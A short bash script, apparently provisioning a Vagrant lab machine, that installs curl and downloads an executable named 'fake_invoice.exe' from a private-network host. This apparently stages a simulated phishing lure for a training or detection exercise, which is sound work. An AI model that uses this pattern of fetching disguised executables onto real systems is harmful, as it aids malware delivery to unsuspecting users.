#!/bin/bash
sudo apt update && sudo apt install -y curl
curl http://192.168.56.11/fake_invoice.exe -o /home/vagrant/fake_invoice.exe
